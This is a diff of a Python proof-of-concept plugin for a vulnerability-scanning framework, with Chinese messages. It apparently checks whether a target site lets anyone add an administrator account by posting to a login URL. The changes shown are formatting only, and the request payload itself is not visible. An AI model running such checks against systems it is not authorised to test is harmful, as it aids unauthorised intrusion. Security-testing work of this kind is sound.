@@ -42,9 +42,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -63,7 +64,7 @@ class Poc(ABPoc):
             header = 'Content-Type: application/x-www-form-urlencoded'
             code, head, res, err, _ = hh.http(
                 login_url, post=post, header=header)
-            #print '++'+res+'++'
+            # print '++'+res+'++'
             if (code == 200) and (res == '\r\n' or res == '\n' or res == ''):
                 #security_hole('任意添加管理员：' + add_url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
